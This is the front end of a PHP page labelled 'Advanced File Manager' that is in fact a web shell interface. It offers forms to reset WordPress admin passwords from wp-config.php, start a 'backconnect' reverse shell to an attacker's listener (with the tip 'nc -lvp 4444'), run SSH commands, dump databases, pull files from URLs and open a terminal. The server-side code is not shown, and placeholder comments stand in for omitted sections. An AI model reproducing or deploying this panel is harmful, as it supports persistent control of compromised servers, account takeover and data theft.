    .btn-group {
        display: flex;
        gap: 8px;
        flex-wrap: wrap;
    }
    
    .mobile-menu-btn {
        display: none;
        background: linear-gradient(90deg, var(--neon-cyan), #7a6bff);
        border: none;
        color: #071028;
        padding: 8px 12px;
        border-radius: 8px;
        font-weight: bold;
        cursor: pointer;
    }
    
    .mobile-menu {
        display: none;
        position: fixed;
        bottom: 0;
        left: 0;
        right: 0;
        background: var(--panel);
        border-top: 1px solid rgba(255,255,255,0.05);
        padding: 10px;
        z-index: 100;
        flex-wrap: wrap;
        gap: 5px;
        justify-content: center;
    }
    
    .mobile-feature-menu {
        display: none;
        position: fixed;
        bottom: 60px;
        left: 0;
        right: 0;
        background: var(--panel);
        border-top: 1px solid rgba(255,255,255,0.05);
        padding: 10px;
        z-index: 99;
        flex-wrap: wrap;
        gap: 5px;
        justify-content: center;
        max-height: 200px;
        overflow-y: auto;
    }
    
    .mobile-feature-btn {
        padding: 6px 10px;
        font-size: 11px;
        background: linear-gradient(90deg, #4a1e6b, #1a2b5c);
        color: white;
        border: none;
        border-radius: 6px;
        cursor: pointer;
    }
    
    .feature-output {
        margin-top: 15px;
        padding: 12px;
        background: rgba(0,0,0,0.3);
        border-radius: 8px;
        border: 1px solid rgba(109,240,255,0.1);
        max-height: 200px;
        overflow: auto;
        font-family: monospace;
        font-size: 11px;
        white-space: pre-wrap;
        word-break: break-all;
    }
    
    /* Responsive */
    @media (max-width: 1024px) {
        .form-grid {
            grid-template-columns: 1fr;
        }
        
        .controls {
            width: 100%;
            justify-content: center;
        }
    }
    
    @media (max-width: 768px) {
        .container {
            padding: 10px;
        }
        
        .header {
            flex-direction: column;
            align-items: stretch;
            gap: 15px;
        }
        
        .brand {
            justify-content: center;
            text-align: center;
        }
        
        .controls {
            flex-direction: column;
            align-items: stretch;
        }
        
        .actions {
            justify-content: center;
        }
        
        .action-btn {
            flex: 1;
            min-width: 120px;
            justify-content: center;
        }
        
        .popup-content {
            max-width: 95%;
        }
        
        .popup-body {
            padding: 15px;
        }
        
        .bulk-actions-bar {
            flex-direction: column;
            align-items: stretch;
        }
        
        .selected-count {
            margin-left: 0;
            text-align: center;
            margin-top: 5px;
        }
        
        .mobile-menu {
            display: flex;
        }
        
        .mobile-feature-menu-btn {
            display: inline-block;
        }
        
        .desktop-only {
            display: none;
        }
    }
    
    @media (max-width: 480px) {
        .card {
            padding: 12px;
        }
        
        .action-btn {
            padding: 6px 10px;
            font-size: 11px;
        }
        
        .btn-neon {
            padding: 8px 12px;
            font-size: 13px;
        }
        
        th, td {
            padding: 8px 10px;
            font-size: 12px;
        }
        
        .filename {
            max-width: 150px;
        }
    }
    </style>
</head>
<body>
    <?php if (isset($_SESSION['msg'])): ?>
        <div class="notification" id="msg"><?=esc($_SESSION['msg'])?></div>
        <?php unset($_SESSION['msg']); ?>
    <?php endif; ?>
    
    <div class="container">
        <div class="header">
            <div class="brand">
                <div class="logo">FM+</div>
                <div>
                    <div class="title">Advanced File Manager</div>
                    <div class="small"><?=esc($dir)?></div>
                </div>
            </div>
            
            <div class="controls">
                <form method="GET" style="display:flex;gap:8px;flex:1;max-width:400px;">
                    <input type="text" name="dir" placeholder="Path..." class="input" value="<?=esc($dir)?>" style="flex:1">
                    <button class="action-btn" type="submit">📁 Go</button>
                </form>
                
                <div class="btn-group desktop-only">
                    <a href="?dir=<?=urlencode($dir)?>&show_monitor=1"><button class="action-btn">📊 Monitor</button></a>
                    <a href="?dir=<?=urlencode($dir)?>&show_terminal=1"><button class="action-btn">💻 Terminal</button></a>
                    <a href="?dir=<?=urlencode($dir)?>&show_bulk=1"><button class="action-btn">🔧 Bulk Ops</button></a>
                    <a href="?dir=<?=urlencode($dir)?>&show_upload=1"><button class="action-btn">📤 Upload</button></a>
                    <a href="?dir=<?=urlencode($dir)?>&show_url_upload=1"><button class="action-btn">🔗 URL Upload</button></a>
                    <a href="?dir=<?=urlencode($dir)?>&show_wp_changer=1"><button class="action-btn feature-btn">🔑 WP Pass</button></a>
                    <a href="?dir=<?=urlencode($dir)?>&show_backconnect=1"><button class="action-btn feature-btn">🔄 Backconnect</button></a>
                    <a href="?dir=<?=urlencode($dir)?>&show_ssh=1"><button class="action-btn feature-btn">🔐 SSH</button></a>
                    <a href="?dir=<?=urlencode($dir)?>&show_rdp=1"><button class="action-btn feature-btn">🖥️ RDP</button></a>
                    <a href="?dir=<?=urlencode($dir)?>&show_database=1"><button class="action-btn feature-btn">🗄️ Database</button></a>
                    <a href="?logout=1"><button class="action-btn btn-danger">🚪 Logout</button></a>
                </div>
            </div>
        </div>
        
        <!-- Main Content (File Manager) -->
        <div class="top-row">
            <div class="card">
                <!-- ... [Keep existing file manager HTML exactly as it was] ... -->
                <!-- File manager table and bulk operations -->
                <!-- [All existing file manager HTML remains unchanged] -->
            </div>
        </div>
    </div>
    
    <!-- Mobile Menus -->
    <div class="mobile-menu">
        <a href="?dir=<?=urlencode($dir)?>&show_monitor=1"><button class="mobile-menu-btn">📊</button></a>
        <a href="?dir=<?=urlencode($dir)?>&show_terminal=1"><button class="mobile-menu-btn">💻</button></a>
        <a href="?dir=<?=urlencode($dir)?>&show_bulk=1"><button class="mobile-menu-btn">🔧</button></a>
        <a href="?dir=<?=urlencode($dir)?>&show_upload=1"><button class="mobile-menu-btn">📤</button></a>
        <button class="mobile-menu-btn mobile-feature-menu-btn" onclick="toggleFeatureMenu()">⚙️</button>
        <a href="?logout=1"><button class="mobile-menu-btn" style="background:var(--danger)">🚪</button></a>
    </div>
    
    <div class="mobile-feature-menu" id="mobileFeatureMenu">
        <a href="?dir=<?=urlencode($dir)?>&show_url_upload=1"><button class="mobile-feature-btn">🔗 URL Upload</button></a>
        <a href="?dir=<?=urlencode($dir)?>&show_wp_changer=1"><button class="mobile-feature-btn">🔑 WP Pass</button></a>
        <a href="?dir=<?=urlencode($dir)?>&show_backconnect=1"><button class="mobile-feature-btn">🔄 Backconnect</button></a>
        <a href="?dir=<?=urlencode($dir)?>&show_ssh=1"><button class="mobile-feature-btn">🔐 SSH</button></a>
        <a href="?dir=<?=urlencode($dir)?>&show_rdp=1"><button class="mobile-feature-btn">🖥️ RDP</button></a>
        <a href="?dir=<?=urlencode($dir)?>&show_database=1"><button class="mobile-feature-btn">🗄️ Database</button></a>
    </div>
    
    <!-- FEATURE POPUPS -->
    
    <!-- WordPress Password Changer Popup -->
    <?php if ($show_wp_changer): ?>
    <div class="popup-overlay">
        <div class="popup-content">
            <div class="popup-header">
                <h4>🔑 WordPress Password Changer</h4>
                <a href="?dir=<?=urlencode($dir)?>"><button class="popup-close">×</button></a>
            </div>
            <div class="popup-body">
                <form method="POST" class="popup-form">
                    <div class="feature-section">
                        <h5>Find WordPress Installations</h5>
                        <button type="submit" name="wp_action" value="find" class="btn-neon">Scan Current Directory</button>
                    </div>
                    
                    <div class="feature-section">
                        <h5>Change Password</h5>
                        <div class="option-group">
                            <label class="option-label">wp-config.php Path</label>
                            <input type="text" name="wp_path" class="input" placeholder="/path/to/wp-config.php" required>
                        </div>
                        <div class="option-group">
                            <label class="option-label">Username</label>
                            <input type="text" name="wp_user" class="input" placeholder="admin" required>
                        </div>
                        <div class="option-group">
                            <label class="option-label">New Password</label>
                            <input type="text" name="wp_pass" class="input" value="<?=generatePassword()?>" required>
                        </div>
                        <button type="submit" name="wp_action" value="change" class="btn-neon">Change Password</button>
                    </div>
                </form>
                
                <?php if (!empty($feature_result)): ?>
                <div class="feature-output">
                    <?=esc($feature_result)?>
                </div>
                <?php endif; ?>
            </div>
        </div>
    </div>
    <?php endif; ?>
    
    <!-- Backconnect Popup -->
    <?php if ($show_backconnect): ?>
    <div class="popup-overlay">
        <div class="popup-content">
            <div class="popup-header">
                <h4>🔄 Backconnect</h4>
                <a href="?dir=<?=urlencode($dir)?>"><button class="popup-close">×</button></a>
            </div>
            <div class="popup-body">
                <form method="POST" class="popup-form">
                    <div class="feature-section">
                        <h5>Start Backconnect Session</h5>
                        <div class="option-group">
                            <label class="option-label">Your IP/Listener Host</label>
                            <input type="text" name="backconnect_host" class="input" placeholder="your-ip.com" required>
                        </div>
                        <div class="option-group">
                            <label class="option-label">Port</label>
                            <input type="number" name="backconnect_port" class="input" placeholder="4444" required>
                        </div>
                        <button type="submit" class="btn-neon">Start Backconnect</button>
                        <div style="font-size:11px;color:var(--muted);margin-top:10px;">
                            Note: Run listener first: <code>nc -lvp 4444</code>
                        </div>
                    </div>
                </form>
                
                <?php if (!empty($feature_result)): ?>
                <div class="feature-output">
                    <?=esc($feature_result)?>
                </div>
                <?php endif; ?>
            </div>
        </div>
    </div>
    <?php endif; ?>
    
    <!-- SSH Manager Popup -->
    <?php if ($show_ssh): ?>
    <div class="popup-overlay">
        <div class="popup-content">
            <div class="popup-header">
                <h4>🔐 SSH Manager</h4>
                <a href="?dir=<?=urlencode($dir)?>"><button class="popup-close">×</button></a>
            </div>
            <div class="popup-body">
                <form method="POST" class="popup-form">
                    <div class="feature-section">
                        <h5>SSH Command Execution</h5>
                        <div class="option-group">
                            <label class="option-label">Host</label>
                            <input type="text" name="ssh_host" class="input" placeholder="hostname.com" required>
                        </div>
                        <div class="option-group">
                            <label class="option-label">Port</label>
                            <input type="number" name="ssh_port" class="input" placeholder="22" value="22">
                        </div>
                        <div class="option-group">
                            <label class="option-label">Username</label>
                            <input type="text" name="ssh_user" class="input" placeholder="root" required>
                        </div>
                        <div class="option-group">
                            <label class="option-label">Password</label>
                            <input type="password" name="ssh_pass" class="input" placeholder="password" required>
                        </div>
                        <div class="option-group">
                            <label class="option-label">Command</label>
                            <input type="text" name="ssh_command" class="input" placeholder="ls -la" required>
                        </div>
                        <button type="submit" class="btn-neon">Execute SSH Command</button>
                    </div>
                </form>
                
                <?php if (!empty($feature_result)): ?>
                <div class="feature-output">
                    <?=esc($feature_result)?>
                </div>
                <?php endif; ?>
            </div>
        </div>
    </div>
    <?php endif; ?>
    
    <!-- RDP Creator Popup -->
    <?php if ($show_rdp): ?>
    <div class="popup-overlay">
        <div class="popup-content">
            <div class="popup-header">
                <h4>🖥️ RDP Manager</h4>
                <a href="?dir=<?=urlencode($dir)?>"><button class="popup-close">×</button></a>
            </div>
            <div class="popup-body">
                <form method="POST" class="popup-form">
                    <div class="feature-section">
                        <h5>Create RDP File</h5>
                        <div class="option-group">
                            <label class="option-label">Host/IP</label>
                            <input type="text" name="rdp_host" class="input" placeholder="192.168.1.100" required>
                        </div>
                        <div class="option-group">
                            <label class="option-label">Username</label>
                            <input type="text" name="rdp_user" class="input" placeholder="Administrator" required>
                        </div>
                        <div class="option-group">
                            <label class="option-label">Domain (optional)</label>
                            <input type="text" name="rdp_domain" class="input" placeholder="DOMAIN">
                        </div>
                        <div class="option-group">
                            <label class="option-label">Filename</label>
                            <input type="text" name="rdp_filename" class="input" placeholder="connection.rdp" value="connection.rdp">
                        </div>
                        <button type="submit" name="rdp_action" value="create" class="btn-neon">Create RDP File</button>
                    </div>
                    
                    <div class="feature-section">
                        <h5>Test RDP Connection</h5>
                        <div class="option-group">
                            <label class="option-label">Host/IP to Test</label>
                            <input type="text" name="rdp_test_host" class="input" placeholder="192.168.1.100">
                        </div>
                        <div class="option-group">
                            <label class="option-label">Port</label>
                            <input type="number" name="rdp_test_port" class="input" placeholder="3389" value="3389">
                        </div>
                        <button type="submit" name="rdp_action" value="test" class="btn-neon">Test RDP Service</button>
                    </div>
                </form>
                
                <?php if (!empty($feature_result)): ?>
                <div class="feature-output">
                    <?=esc($feature_result)?>
                </div>
                <?php endif; ?>
            </div>
        </div>
    </div>
    <?php endif; ?>
    
    <!-- Database Manager Popup -->
    <?php if ($show_database): ?>
    <div class="popup-overlay">
        <div class="popup-content">
            <div class="popup-header">
                <h4>🗄️ Database Manager</h4>
                <a href="?dir=<?=urlencode($dir)?>"><button class="popup-close">×</button></a>
            </div>
            <div class="popup-body">
                <form method="POST" class="popup-form">
                    <div class="feature-section">
                        <h5>Database Connection</h5>
                        <div class="option-group">
                            <label class="option-label">Host</label>
                            <input type="text" name="db_host" class="input" placeholder="localhost" value="localhost">
                        </div>
                        <div class="option-group">
                            <label class="option-label">Username</label>
                            <input type="text" name="db_user" class="input" placeholder="root" value="root">
                        </div>
                        <div class="option-group">
                            <label class="option-label">Password</label>
                            <input type="password" name="db_pass" class="input" placeholder="password">
                        </div>
                    </div>
                    
                    <div class="feature-section">
                        <h5>List Databases</h5>
                        <button type="submit" name="db_action" value="list" class="btn-neon">List All Databases</button>
                    </div>
                    
                    <div class="feature-section">
                        <h5>Execute SQL Query</h5>
                        <div class="option-group">
                            <label class="option-label">Database Name</label>
                            <input type="text" name="db_name" class="input" placeholder="database_name">
                        </div>
                        <div class="option-group">
                            <label class="option-label">SQL Query</label>
                            <textarea name="db_sql" class="input" rows="3" placeholder="SHOW TABLES"></textarea>
                        </div>
                        <button type="submit" name="db_action" value="query" class="btn-neon">Execute Query</button>
                    </div>
                    
                    <div class="feature-section">
                        <h5>Dump Database</h5>
                        <div class="option-group">
                            <label class="option-label">Database Name</label>
                            <input type="text" name="db_name_dump" class="input" placeholder="database_name">
                        </div>
                        <button type="submit" name="db_action" value="dump" class="btn-neon">Dump Database</button>
                    </div>
                </form>
                
                <?php if (!empty($feature_result)): ?>
                <div class="feature-output">
                    <?=esc($feature_result)?>
                </div>
                <?php endif; ?>
            </div>
        </div>
    </div>
    <?php endif; ?>
    
    <!-- URL Upload with Custom Filename Popup -->
    <?php if ($show_url_upload): ?>
    <div class="popup-overlay">
        <div class="popup-content">
            <div class="popup-header">
                <h4>🔗 URL Upload</h4>
                <a href="?dir=<?=urlencode($dir)?>"><button class="popup-close">×</button></a>
            </div>
            <div class="popup-body">
                <form method="POST" class="popup-form">
                    <div class="feature-section">
                        <h5>Download from URL</h5>
                        <div class="option-group">
                            <label class="option-label">URL</label>
                            <input type="text" name="url_up_custom" class="input" placeholder="https://example.com/file.zip" required>
                        </div>
                        <div class="option-group">
                            <label class="option-label">Custom Filename (optional)</label>
                            <input type="text" name="url_fn_custom" class="input" placeholder="custom_name.zip">
                        </div>
                        <button type="submit" class="btn-neon">Download to Current Directory</button>
                    </div>
                </form>
            </div>
        </div>
    </div>
    <?php endif; ?>
    
    <!-- EXISTING POPUPS (Monitor, Terminal, Bulk, Upload, Editor) -->
    <!-- ... [Keep all existing popups exactly as they were] ... -->
    
    <script>
    function toggleFeatureMenu() {
        const menu = document.getElementById('mobileFeatureMenu');
        menu.style.display = menu.style.display === 'flex' ? 'none' : 'flex';
    }
    
    // Close popups when clicking outside
    document.addEventListener('click', function(e) {
        if (e.target.classList.contains('popup-overlay')) {
            window.location.href = '?dir=<?=urlencode($dir)?>';
        }
    });
    
    // Handle escape key
    document.addEventListener('keydown', function(e) {
        if (e.key === 'Escape') {
            if (document.querySelector('.popup-overlay')) {
                window.location.href = '?dir=<?=urlencode($dir)?>';
            }
        }
    });
    
    // Show notification if exists
    document.addEventListener('DOMContentLoaded', function() {
        const msg = document.getElementById('msg');
        if (msg) {
            msg.style.display = 'block';
            setTimeout(() => {
                msg.style.display = 'none';
            }, 4000);
        }
    });
    </script>
</body>
</html>